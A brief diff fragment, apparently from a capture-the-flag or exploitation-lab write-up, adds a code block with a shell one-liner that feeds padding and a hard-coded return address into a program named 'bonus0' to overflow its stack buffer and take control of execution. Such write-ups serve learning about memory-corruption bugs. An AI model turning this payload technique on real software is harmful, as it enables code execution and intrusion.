@@ -140,6 +140,9 @@ cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 
 ```
 
+```
+(python -c 'print "A" * 20' ; python -c 'print "B" * 9 + "\xbf\xff\xfd\xf0"[::-1] + "C" * 7' ; cat) | ./bonus0
+```
 
 
 
